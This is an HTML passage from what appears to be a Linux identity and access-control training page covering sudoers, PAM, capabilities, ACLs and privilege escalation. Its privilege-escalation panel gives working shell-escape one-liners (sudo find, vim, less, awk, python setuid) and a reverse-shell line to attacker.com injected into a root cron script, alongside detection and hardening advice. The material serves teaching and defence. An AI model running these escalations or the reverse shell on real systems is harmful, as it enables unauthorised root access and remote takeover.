────</span>\n        <span class=\"ocn\"># Format: user  host=(run_as_user:run_as_group)  commands</span>\n        <span class=\"ogn\">alice   ALL=(root)  /usr/bin/systemctl restart nginx, /usr/bin/journalctl</span>\n        <span class=\"ocn\">%developers ALL=(ALL:ALL) /usr/bin/apt, /usr/bin/docker</span>\n        <span class=\"oyn\">Defaults  timestamp_timeout=5    # re-ask after 5 min (not 15)</span>\n        <span class=\"oyn\">Defaults  logfile=/var/log/sudo.log</span>\n        <span class=\"oyn\">Defaults  requiretty             # must be real TTY, no scripts</span>\n        <span class=\"sec\">──── DANGEROUS SUDOERS PATTERNS ────</span>\n        <span class=\"ored\">alice ALL=(ALL) NOPASSWD: ALL           # full root, no password = backdoor</span>\n        <span class=\"ored\">bob   ALL=(ALL) /usr/bin/vim            # vim can spawn shell: :!/bin/bash</span>\n        <span class=\"ored\">carol ALL=(ALL) /usr/bin/find           # find can exec: find / -exec /bin/sh \\;</span>\n        <span class=\"ored\">dave  ALL=(ALL) !/usr/bin/su, /bin/bash # bypass: sudo bash</span>\n        <span class=\"sec\">──── AUDIT CURRENT SUDO RULES ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">sudo -l -U alice</span></span>\n        <span class=\"out\">Matching Defaults entries for alice on lab:</span>\n        <span class=\"out\">    env_reset, mail_badpass, secure_path=...</span>\n        <span class=\"oyn\">User alice may run the following commands on lab:</span>\n        <span class=\"ogn\">    (ALL : ALL) ALL</span>\n        <span class=\"sec\">──── SUDO LOG FORENSICS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">grep sudo /var/log/auth.log | grep -v \"pam_unix\" | tail -10</span></span>\n        <span class=\"ocn\">May 03 10:15:22 lab sudo: alice : COMMAND=/usr/bin/systemctl restart nginx</span>\n        <span class=\"ored\">May 03 02:44:11 lab sudo: attacker : 3 incorrect password attempts ; COMMAND=/bin/bash</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- ═══ PANEL 04 — PAM ═══ -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🔑</span><span class=\"pt\">PAM — Pluggable Authentication Modules</span><span class=\"pn\">PANEL 04</span></div>\n  <div class=\"pb\">\n    <div class=\"g2\" style=\"margin-bottom:14px\">\n      <div class=\"cb cbl\">\n        <div class=\"cbt\">What Is PAM?</div>\n        <div class=\"ct\">\n          PAM decouples <span class=\"hl\">authentication</span> from applications. Instead of each application implementing its own login logic, they call PAM. PAM consults a chain of modules — each can verify identity, set limits, or enforce policy.<br><br>\n          Any service with a file in <code>/etc/pam.d/</code> uses PAM: <span class=\"hc\">login</span>, <span class=\"hc\">sshd</span>, <span class=\"hc\">sudo</span>, <span class=\"hc\">su</span>, <span class=\"hc\">gdm</span>, <span class=\"hc\">cron</span>. Misconfiguring PAM can lock everyone out or silently bypass authentication.\n        </div>\n      </div>\n      <div class=\"cb cbg\">\n        <div class=\"cbt\">PAM Module Types</div>\n        <div style=\"font-size:12px;color:var(--t2);line-height:1.9\">\n          <span class=\"hl\">auth</span> — verify identity (password, TOTP, SSH key)<br>\n          <span class=\"hc\">account</span> — check account validity (expired? locked? time restriction?)<br>\n          <span class=\"hy\">password</span> — handle password updates (complexity, history)<br>\n          <span class=\"ho\">session</span> — setup/teardown (mount homedir, set ulimits, log session)\n        </div>\n      </div>\n    </div>\n\n    <!-- PAM control flags -->\n    <div style=\"font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px\">PAM Control Flags — How Failures Are Handled</div>\n    <table class=\"tbl\" style=\"margin-bottom:14px\">\n      <thead><tr><th>Control Flag</th><th>Behaviour on Success</th><th>Behaviour on Failure</th></tr></thead>\n      <tbody>\n        <tr><td>required</td><td style=\"color:var(--t2)\">Continue stack</td><td style=\"color:var(--r)\">Continue stack but final result = FAIL</td></tr>\n        <tr><td>requisite</td><td style=\"color:var(--t2)\">Continue stack</td><td style=\"color:var(--r)\">Immediately fail — stop processing</td></tr>\n        <tr><td>sufficient</td><td style=\"color:var(--g)\">Immediately succeed (if no prior required failure)</td><td style=\"color:var(--t2)\">Ignore — continue stack</td></tr>\n        <tr><td>optional</td><td style=\"color:var(--t2)\">Continue — doesn't affect final result</td><td style=\"color:var(--t2)\">Continue — doesn't affect final result</td></tr>\n      </tbody>\n    </table>\n\n    <!-- PAM stack for sshd -->\n    <div style=\"font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px\">/etc/pam.d/sshd — Annotated SSH PAM Stack</div>\n    <div style=\"background:var(--bg);border:1px solid var(--b2);padding:14px;margin-bottom:14px\">\n      <div style=\"display:flex;gap:10px;font-family:var(--sans);font-size:10px;font-weight:600;letter-spacing:1px;text-transform:uppercase;color:var(--t3);margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid var(--b2)\">\n        <span style=\"width:80px\">TYPE</span><span style=\"width:90px\">CONTROL</span><span style=\"width:220px\">MODULE</span><span>PURPOSE</span>\n      </div>\n      <div class=\"pam-module\">\n        <div class=\"pam-type\" style=\"color:var(--g)\">auth</div>\n        <div class=\"pam-ctrl\" style=\"color:var(--y)\">required</div>\n        <div class=\"pam-mod\">pam_env.so</div>\n        <div class=\"pam-desc\">Load environment variables from /etc/environment</div>\n      </div>\n      <div class=\"pam-module\">\n        <div class=\"pam-type\" style=\"color:var(--g)\">auth</div>\n        <div class=\"pam-ctrl\" style=\"color:var(--y)\">required</div>\n        <div class=\"pam-mod\">pam_faildelay.so delay=2000000</div>\n        <div class=\"pam-desc\">Add 2s delay on failure (brute-force mitigation)</div>\n      </div>\n      <div class=\"pam-module\">\n        <div class=\"pam-type\" style=\"color:var(--g)\">auth</div>\n        <div class=\"pam-ctrl\" style=\"color:var(--r)\">requisite</div>\n        <div class=\"pam-mod\">pam_nologin.so</div>\n        <div class=\"pam-desc\">Deny login if /etc/nologin exists (maintenance mode)</div>\n      </div>\n      <div class=\"pam-module\">\n        <div class=\"pam-type\" style=\"color:var(--g)\">auth</div>\n        <div class=\"pam-ctrl\" style=\"color:var(--g)\">sufficient</div>\n        <div class=\"pam-mod\" style=\"color:var(--c)\">pam_unix.so nullok</div>\n        <div class=\"pam-desc\">Verify password against /etc/shadow — if OK, auth succeeds</div>\n      </div>\n      <div class=\"pam-module\">\n        <div class=\"pam-type\" style=\"color:var(--g)\">auth</div>\n        <div class=\"pam-ctrl\" style=\"color:var(--y)\">required</div>\n        <div class=\"pam-mod\">pam_google_authenticator.so</div>\n        <div class=\"pam-desc\">TOTP 2FA — require OTP after password (MFA stack)</div>\n      </div>\n      <div class=\"pam-module\">\n        <div class=\"pam-type\" style=\"color:var(--c)\">account</div>\n        <div class=\"pam-ctrl\" style=\"color:var(--y)\">required</div>\n        <div class=\"pam-mod\" style=\"color:var(--c)\">pam_unix.so</div>\n        <div class=\"pam-desc\">Check account not expired, not locked</div>\n      </div>\n      <div class=\"pam-module\">\n        <div class=\"pam-type\" style=\"color:var(--c)\">account</div>\n        <div class=\"pam-ctrl\" style=\"color:var(--y)\">required</div>\n        <div class=\"pam-mod\">pam_access.so</div>\n        <div class=\"pam-desc\">Check /etc/security/access.conf (IP/group restrictions)</div>\n      </div>\n      <div class=\"pam-module\">\n        <div class=\"pam-type\" style=\"color:var(--o)\">session</div>\n        <div class=\"pam-ctrl\" style=\"color:var(--y)\">required</div>\n        <div class=\"pam-mod\">pam_limits.so</div>\n        <div class=\"pam-desc\">Apply /etc/security/limits.conf (ulimits per user)</div>\n      </div>\n      <div class=\"pam-module\" style=\"border:none\">\n        <div class=\"pam-type\" style=\"color:var(--o)\">session</div>\n        <div class=\"pam-ctrl\" style=\"color:var(--t3)\">optional</div>\n        <div class=\"pam-mod\">pam_lastlog.so</div>\n        <div class=\"pam-desc\">Display last login info after successful auth</div>\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">PAM hardening & audit</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── PASSWORD COMPLEXITY (pam_pwquality) ────</span>\n        <span class=\"out\"># /etc/security/pwquality.conf</span>\n        <span class=\"ocn\">minlen = 14</span>\n        <span class=\"ocn\">minclass = 4        # must use all 4 char classes</span>\n        <span class=\"ocn\">maxrepeat = 3       # no more than 3 repeated chars</span>\n        <span class=\"ocn\">dcredit = -1        # at least 1 digit</span>\n        <span class=\"ocn\">ucredit = -1        # at least 1 uppercase</span>\n        <span class=\"ocn\">lcredit = -1        # at least 1 lowercase</span>\n        <span class=\"ocn\">ocredit = -1        # at least 1 special char</span>\n        <span class=\"sec\">──── ACCOUNT LOCKOUT (pam_faillock) ────</span>\n        <span class=\"out\"># /etc/security/faillock.conf</span>\n        <span class=\"oyn\">deny = 5            # lock after 5 failed attempts</span>\n        <span class=\"oyn\">unlock_time = 900   # unlock after 15 minutes</span>\n        <span class=\"oyn\">fail_interval = 300 # count failures within 5 min window</span>\n        <span class=\"sec\">──── CHECK FAILED LOGIN ATTEMPTS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">faillock --user alice</span></span>\n        <span class=\"out\">alice:</span>\n        <span class=\"ored\">When                Type  Source        Valid</span>\n        <span class=\"ored\">2026-05-03 02:11:01 RHOST 10.10.10.5     V   ← brute force from external IP</span>\n        <span class=\"ored\">2026-05-03 02:11:03 RHOST 10.10.10.5     V</span>\n        <span class=\"sec\">──── RESOURCE LIMITS (/etc/security/limits.conf) ────</span>\n        <span class=\"ocn\">alice  soft  nproc  100     # max 100 processes</span>\n        <span class=\"ocn\">alice  hard  nproc  200</span>\n        <span class=\"ocn\">@developers soft nofile 65536  # file descriptor limit for group</span>\n        <span class=\"ocn\">*  hard  core  0            # disable core dumps globally</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- ═══ PANEL 05 — CAPABILITIES ═══ -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🎯</span><span class=\"pt\">Linux Capabilities — Fine-Grained Privilege Model</span><span class=\"pn\">PANEL 05</span></div>\n  <div class=\"pb\">\n    <div class=\"info\"><span style=\"color:var(--c);flex-shrink:0\">ℹ</span><span>Traditionally: root = all privileges or nothing. <strong style=\"color:var(--c)\">Capabilities</strong> split root's power into ~40 independent tokens. A process can have specific capabilities without being fully root. Example: nginx can bind port 80 with only <code>CAP_NET_BIND_SERVICE</code> — no other root powers needed.</span></div>\n\n    <div class=\"g4\" style=\"margin-bottom:14px\">\n      <div class=\"cap-card\">\n        <div class=\"cap-name\">CAP_NET_BIND_SERVICE</div>\n        <div class=\"cap-desc\">Bind to ports below 1024 (privileged ports). Webservers, SSH daemon.</div>\n        <div class=\"cap-risk tag tg\">LOW RISK</div>\n      </div>\n      <div class=\"cap-card\">\n        <div class=\"cap-name\">CAP_NET_RAW</div>\n        <div class=\"cap-desc\">Create raw sockets. Needed by ping, tcpdump, nmap.</div>\n        <div class=\"cap-risk tag ty\">MEDIUM RISK</div>\n      </div>\n      <div class=\"cap-card\">\n        <div class=\"cap-name\">CAP_SYS_PTRACE</div>\n        <div class=\"cap-desc\">Trace/debug any process (ptrace syscall). Debuggers, strace.</div>\n        <div class=\"cap-risk tag tr2\">HIGH RISK</div>\n      </div>\n      <div class=\"cap-card\">\n        <div class=\"cap-name\">CAP_SYS_ADMIN</div>\n        <div class=\"cap-desc\">Massive: mount/unmount, chroot, sethostname, many more. Effectively root.</div>\n        <div class=\"cap-risk tag tr2\">CRITICAL</div>\n      </div>\n      <div class=\"cap-card\">\n        <div class=\"cap-name\">CAP_CHOWN</div>\n        <div class=\"cap-desc\">Change file UID/GID arbitrarily. Can chown /etc/shadow to self.</div>\n        <div class=\"cap-risk tag tr2\">HIGH RISK</div>\n      </div>\n      <div class=\"cap-card\">\n        <div class=\"cap-name\">CAP_DAC_OVERRIDE</div>\n        <div class=\"cap-desc\">Bypass all DAC file permission checks. Read any file regardless of rwx.</div>\n        <div class=\"cap-risk tag tr2\">CRITICAL</div>\n      </div>\n      <div class=\"cap-card\">\n        <div class=\"cap-name\">CAP_SETUID</div>\n        <div class=\"cap-desc\">Set arbitrary UIDs. Process can become root (UID 0) at will.</div>\n        <div class=\"cap-risk tag tr2\">CRITICAL</div>\n      </div>\n      <div class=\"cap-card\">\n        <div class=\"cap-name\">CAP_SYS_MODULE</div>\n        <div class=\"cap-desc\">Load/unload kernel modules. One malicious module = full kernel compromise.</div>\n        <div class=\"cap-risk tag tr2\">CRITICAL</div>\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">Capabilities management & audit</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── GRANT CAPABILITY TO BINARY (instead of SUID) ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">setcap cap_net_bind_service=+eip /usr/bin/node</span></span>\n        <span class=\"ocn\"># Node.js can now bind port 80 without running as root or SUID</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">getcap /usr/bin/node</span></span>\n        <span class=\"ogn\">/usr/bin/node cap_net_bind_service=eip</span>\n        <span class=\"sec\">──── AUDIT ALL BINARIES WITH CAPABILITIES ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">getcap -r / 2>/dev/null</span></span>\n        <span class=\"out\">/usr/bin/ping         cap_net_raw=ep</span>\n        <span class=\"out\">/usr/bin/dumpcap      cap_net_admin,cap_net_raw=eip</span>\n        <span class=\"ored\">/usr/bin/python3.12   cap_setuid=ep  ← dangerous! python can setuid to 0</span>\n        <span class=\"sec\">──── PROCESS CAPABILITIES ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">cat /proc/1234/status | grep Cap</span></span>\n        <span class=\"out\">CapInh: 0000000000000000   # inherited caps</span>\n        <span class=\"out\">CapPrm: 0000000000003000   # permitted caps</span>\n        <span class=\"oyn\">CapEff: 0000000000003000   # effective (active) caps</span>\n        <span class=\"out\">CapBnd: 000001ffffffffff   # bounding set (ceiling)</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">capsh --decode=0000000000003000</span></span>\n        <span class=\"ocn\">0x0000000000003000=cap_net_bind_service,cap_net_admin</span>\n        <span class=\"sec\">──── DROP ALL CAPS IN CONTAINER (secure config) ────</span>\n        <span class=\"out\"># docker-compose.yml</span>\n        <span class=\"ocn\">cap_drop: [ALL]</span>\n        <span class=\"ocn\">cap_add: [NET_BIND_SERVICE]  # only what's needed</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- ═══ PANEL 06 — PRIVILEGE ESCALATION ═══ -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🔺</span><span class=\"pt\">Privilege Escalation — Attack Vectors &amp; Detection</span><span class=\"pn\">PANEL 06</span></div>\n  <div class=\"pb\">\n    <div class=\"danger\"><span style=\"color:var(--r);flex-shrink:0\">⛔</span><span><strong style=\"color:var(--r)\">Red Team:</strong> Privilege escalation = going from low-privilege user → root. Linux misconfigurations make this the most common post-exploitation technique. Every one of these vectors has been used in real-world breaches.</span></div>\n\n    <!-- PrivEsc chains -->\n    <div style=\"font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:10px\">Common Privilege Escalation Chains</div>\n\n    <!-- SUID -->\n    <div style=\"background:var(--bg3);border:1px solid rgba(255,59,59,.3);padding:12px 14px;margin-bottom:8px\">\n      <div style=\"font-family:var(--sans);font-weight:700;font-size:12px;color:var(--r);margin-bottom:6px\">① SUID Binary Abuse</div>\n      <div class=\"pe-chain\">\n        <div class=\"pe-box\" style=\"border-color:rgba(0,212,255,.3)\"><div class=\"pe-title\" style=\"color:var(--c)\">Regular user</div><div class=\"pe-sub\">uid=1001(alice)</div></div>\n        <div class=\"pe-arrow\">→</div>\n        <div class=\"pe-box\" style=\"border-color:rgba(255,215,0,.3)\"><div class=\"pe-title\" style=\"color:var(--y)\">Find SUID binary</div><div class=\"pe-sub\">find / -perm -4000</div></div>\n        <div class=\"pe-arrow\">→</div>\n        <div class=\"pe-box\" style=\"border-color:rgba(255,140,0,.3)\"><div class=\"pe-title\" style=\"color:var(--o)\">Exploit binary</div><div class=\"pe-sub\">GTFOBins technique</div></div>\n        <div class=\"pe-arrow\">→</div>\n        <div class=\"pe-box\" style=\"border-color:rgba(255,59,59,.4)\"><div class=\"pe-title\" style=\"color:var(--r)\">Root shell</div><div class=\"pe-sub\">uid=0(root)</div></div>\n      </div>\n      <div style=\"font-size:11px;color:var(--t3);margin-top:8px\">Example: <span style=\"color:var(--c)\">sudo find / -exec /bin/sh \\;</span> or <span style=\"color:var(--c)\">python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'</span> if python has cap_setuid</div>\n    </div>\n\n    <!-- sudo misconfiguration -->\n    <div style=\"background:var(--bg3);border:1px solid rgba(255,59,59,.3);padding:12px 14px;margin-bottom:8px\">\n      <div style=\"font-family:var(--sans);font-weight:700;font-size:12px;color:var(--r);margin-bottom:6px\">② sudo Misconfiguration</div>\n      <div style=\"font-size:12px;color:var(--t2);line-height:1.8\">\n        <span style=\"color:var(--c)\">alice ALL=(ALL) /usr/bin/vim</span> → <span style=\"color:var(--r)\">sudo vim → :!/bin/bash → root shell</span><br>\n        <span style=\"color:var(--c)\">alice ALL=(ALL) /usr/bin/less</span> → <span style=\"color:var(--r)\">sudo less /etc/passwd → !/bin/bash → root shell</span><br>\n        <span style=\"color:var(--c)\">alice ALL=(ALL) /usr/bin/awk</span> → <span style=\"color:var(--r)\">sudo awk 'BEGIN {system(\"/bin/bash\")}'</span><br>\n        <span style=\"color:var(--c)\">alice ALL=(ALL) /usr/bin/python3 /opt/script.py</span> → <span style=\"color:var(--r)\">if script.py is writable, replace contents with os.system('/bin/bash')</span>\n      </div>\n      <div style=\"font-size:11px;color:var(--t3);margin-top:6px\">Reference: <span style=\"color:var(--y)\">GTFOBins (gtfobins.github.io)</span> — comprehensive list of sudo/SUID escape techniques</div>\n    </div>\n\n    <!-- weak file permissions -->\n    <div style=\"background:var(--bg3);border:1px solid rgba(255,59,59,.3);padding:12px 14px;margin-bottom:8px\">\n      <div style=\"font-family:var(--sans);font-weight:700;font-size:12px;color:var(--r);margin-bottom:6px\">③ World-Writable Cron / Script Run as Root</div>\n      <div style=\"font-size:12px;color:var(--t2);line-height:1.8\">\n        <span style=\"color:var(--o)\">root's crontab runs:</span> <span style=\"color:var(--c)\">/opt/scripts/backup.sh every minute</span><br>\n        <span style=\"color:var(--o)\">backup.sh permissions:</span> <span style=\"color:var(--r)\">-rwxrwxrwx (world-writable!)</span><br>\n        <span style=\"color:var(--y)\">Attack:</span> <span style=\"color:var(--c)\">echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /opt/scripts/backup.sh</span><br>\n        <span style=\"color:var(--y)\">Result:</span> <span style=\"color:var(--r)\">Within 60s, root reverse shell to attacker</span>\n      </div>\n    </div>\n\n    <!-- PATH hijacking -->\n    <div style=\"background:var(--bg3);border:1px solid rgba(255,59,59,.3);padding:12px 14px;margin-bottom:8px\">\n      <div style=\"font-family:var(--sans);font-weight:700;font-size:12px;color:var(--r);margin-bottom:6px\">④ PATH Hijacking</div>\n      <div style=\"font-size:12px;color:var(--t2);line-height:1.8\">\n        SUID binary or sudo script calls <span style=\"color:var(--c)\">system(\"ps\")</span> without full path → attacker creates <span style=\"color:var(--c)\">/tmp/ps</span> with malicious content → prepend /tmp to PATH → SUID binary runs attacker's ps as root.<br>\n        <span style=\"color:var(--y)\">Fix: Always use absolute paths in scripts run as root. sudo sets secure_path.</span>\n      </div>\n    </div>\n\n    <!-- kernel exploit -->\n    <div style=\"background:var(--bg3);border:1px solid rgba(255,59,59,.3);padding:12px 14px;margin-bottom:14px\">\n      <div style=\"font-family:var(--sans);font-weight:700;font-size:12px;color:var(--r);margin-bottom:6px\">⑤ Kernel Exploits</div>\n      <div style=\"font-size:12px;color:var(--t2);line-height:1.8\">\n        Dirty COW (CVE-2016-5195), DirtyCred (CVE-2022-2588), Netfilter (CVE-2022-25636) — race conditions or type confusion in kernel give any user root.<br>\n        Check: <span style=\"color:var(--c)\">uname -r</span> → compare against known vulnerable kernels. <span style=\"color:var(--c)\">linux-exploit-suggester.sh</span> automates this.\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">PrivEsc enumeration commands (audit perspective)</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── AUTOMATED ENUMERATION ────</span>\n        <span><span class=\"pr\">alice@lab:~$ </span><span style=\"color:#fff\">sudo -l                        # what can I sudo?</span></span>\n        <span><span class=\"pr\">alice@lab:~$ </span><span style=\"color:#fff\">find / -perm -4000 2>/dev/null  # SUID binaries</span></span>\n        <span><span class=\"pr\">alice@lab:~$ </span><span style=\"color:#fff\">find / -perm -2000 2>/dev/null  # SGID binaries</span></span>\n        <span><span class=\"pr\">alice@lab:~$ </span><span style=\"color:#fff\">getcap -r / 2>/dev/null         # capabilities</span></span>\n        <span><span class=\"pr\">alice@lab:~$ </span><span style=\"color:#fff\">cat /etc/crontab; ls /etc/cron.*</span></span>\n        <span><span class=\"pr\">alice@lab:~$ </span><span style=\"color:#fff\">find / -writable -not -path '/proc/*' 2>/dev/null | head -20</span></span>\n        <span class=\"sec\">──── PRIVILEGE ESCALATION VIA SUDO + LESS ────</span>\n        <span><span class=\"pr\">alice@lab:~$ </span><span style=\"color:#fff\">sudo less /etc/passwd</span></span>\n        <span class=\"out\">... (less pager opens)</span>\n        <span class=\"oyn\">!/bin/bash</span>\n        <span class=\"ored\">root@lab:/home/alice#   ← root shell via less escape!</span>\n        <span class=\"sec\">──── DETECTION: MONITOR PRIVESC ATTEMPTS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -k root_cmds</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">ausearch -k root_cmds | grep -v \"sshd\\|cron\\|systemd\" | tail -10</span></span>\n        <span class=\"ored\">type=EXECVE msg=audit: argc=2 a0=\"/bin/bash\" a1=\"-i\"  ← suspicious interactive bash as root</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- ═══ PANEL 07 — ACLs DEEP DIVE ═══ -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">📋</span><span class=\"pt\">Access Control Lists (ACLs) — Beyond rwx</span><span class=\"pn\">PANEL 07</span></div>\n  <div class=\"pb\">\n    <div class=\"g2\" style=\"margin-bottom:14px\">\n      <div class=\"cb cbl\">\n        <div class=\"cbt\">Why ACLs?</div>\n        <div class=\"ct\">\n          Standard Unix permissions support only <span class=\"hl\">one owner + one group + others</span>. ACLs extend this to arbitrary users and groups per file.<br><br>\n          Scenario: /var/reports/ — root owns it, sysadmin group has rw, but you also need to give specific access to <span class=\"hc\">contractor1</span> (r) and <span class=\"hc\">finance_bot</span> (rw) without adding them to sysadmin group.<br><br>\n          The <span class=\"hl\">effective mask</span> limits the maximum permissions any ACL entry can have. It's recalculated when group or ACL entries change.\n        </div>\n      </div>\n      <div class=\"cb cbp\">\n        <div class=\"cbt\">ACL Inheritance (Default ACLs)</div>\n        <div class=\"ct\">\n          Set <span class=\"hp\">default ACLs</span> on a directory — all <em>new files</em> created inside automatically inherit those ACLs.<br><br>\n          <code style=\"color:var(--c)\">setfacl -d -m u:bob:rx /data/shared</code><br><br>\n          New files in /data/shared will grant bob read+execute automatically. Critical for shared directories where new files must always have consistent permissions.\n        </div>\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">ACL operations — enterprise scenarios</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── SET ACLs ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">setfacl -m u:alice:rwx,u:contractor1:r,g:finance:rw /var/reports/</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">setfacl -d -m u:alice:rwx,g:finance:rw /var/reports/ # default ACL</span></span>\n        <span class=\"sec\">──── READ ACLs ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">getfacl /var/reports/</span></span>\n        <span class=\"out\"># file: reports/</span>\n        <span class=\"out\"># owner: root</span>\n        <span class=\"out\"># group: sysadmin</span>\n        <span class=\"out\">user::rwx</span>\n        <span class=\"ogn\">user:alice:rwx          # alice has full access via ACL</span>\n        <span class=\"ocn\">user:contractor1:r--    # contractor: read-only</span>\n        <span class=\"out\">group::rw-</span>\n        <span class=\"ogn\">group:finance:rw-       # finance group: read+write</span>\n        <span class=\"oyn\">mask::rwx               # effective permission ceiling</span>\n        <span class=\"out\">other::---</span>\n        <span class=\"out\">default:user::rwx       # new files inherit these</span>\n        <span class=\"out\">default:group:finance:rw-</span>\n        <span class=\"sec\">──── REMOVE ACLs ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">setfacl -x u:contractor1 /var/reports/  # remove one entry</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">setfacl -b /var/reports/               # remove ALL ACLs</span></span>\n        <span class=\"sec\">──── DETECT FILES WITH ACLs (+ in ls output) ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">ls -la /var/reports/</span></span>\n        <span class=\"ocn\">drwxrwx---+ 2 root sysadmin 4096 /var/reports/</span>\n        <span class=\"out\">#        ↑ the '+' means ACLs are set — getfacl to see them</span>\n        <span class=\"sec\">──── FIND ALL FILES WITH ACLS ON SYSTEM ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">getfacl -R -s -p / 2>/dev/null | grep \"^# file:\" | head -10</span></span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- ═══ PANEL 08 — LINUX VS WINDOWS IAM ═══ -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">⇄</span><span class=\"pt\">Linux vs Windows — Identity &amp; Access Control Comparison</span><span class=\"pn\">PANEL 08</span></div>\n  <div class=\"pb\">\n    <table class=\"tbl\">\n      <thead><tr><th>Dimension</th><th>🐧 Linux</th><th>🪟 Windows</th></tr></thead>\n      <tbody>\n        <tr><td>Identity token</td><td style=\"color:var(--t2)\">UID / GID (integer) — resolved by NSS (/etc/passwd or LDAP)</td><td style=\"color:var(--t2)\">SID (Security Identifier) — binary GUID-like, includes domain</td></tr>\n        <tr><td>Superuser</td><td style=\"color:var(--t2)\">root (UID 0) — one account, all-powerful</td><td style=\"color:var(--t2)\">SYSTEM / Administrator — SYSTEM is highest, runs services</td></tr>\n        <tr><td>Privilege elevation</td><td style=\"color:var(--g)\">sudo — explicit, logged, per-command, policy in sudoers</td><td style=\"color:var(--t2)\">UAC (User Account Control) — GUI prompt, token elevation</td></tr>\n        <tr><td>Permission model</td><td style=\"color:var(--t2)\">DAC: rwx bits + POSIX ACLs + capabilities + LSM (SELinux/AppArmor)</td><td style=\"color:var(--t2)\">NTFS ACLs (SID-based), integrity levels, privileges</td></tr>\n        <tr><td>Mandatory access control</td><td style=\"color:var(--g)\">SELinux / AppArmor — process confinement, file labelling</td><td style=\"color:var(--y)\">Windows Integrity Levels (Low/Medium/High/System) — weaker</td></tr>\n        <tr><td>Audit logging</td><td style=\"color:var(--g)\">auditd, /var/log/auth.log, journald — flexible, text-based</td><td style=\"color:var(--t2)\">Windows Event Log (.evtx) — Event IDs, PowerShell logging</td></tr>\n        <tr><td>Remote auth</td><td style=\"color:var(--g)\">SSH keys (cert-based), Kerberos, LDAP, PAM modules</td><td style=\"color:var(--t2)\">NTLM, Kerberos, RDP, WinRM, LDAP (AD)</td></tr>\n        <tr><td>Service accounts</td><td style=\"color:var(--g)\">Dedicated UIDs, nologin shell, /etc/passwd entry</td><td style=\"color:var(--t2)\">gMSA (group Managed Service Accounts), auto-rotating passwords</td></tr>\n        <tr><td>Password storage</td><td style=\"color:var(--g)\">SHA-512 hash in /etc/shadow (root-only readable)</td><td style=\"color:var(--t2)\">NT hash in SAM (protected) / domain: NTDS.dit</td></tr>\n        <tr><td>Pass-the-hash attack</td><td style=\"color:var(--g)\">Not directly applicable (different hash use)</td><td style=\"color:var(--r)\">Major risk — NTLM hashes can authenticate without cracking</td></tr>\n        <tr><td>Group policy</td><td style=\"color:var(--t2)\">Manual config / Ansible / Chef / Puppet</td><td style=\"color:var(--g)\">GPO (Group Policy Objects) — centralized, hierarchical</td></tr>\n        <tr><td>Multi-factor auth</td><td style=\"color:var(--g)\">PAM module (Google Auth, Duo, YubiKey) — any service</td><td style=\"color:var(--t2)\">Azure MFA, Windows Hello — mainly GUI and cloud-integrated</td></tr>\n        <tr><td>Privilege 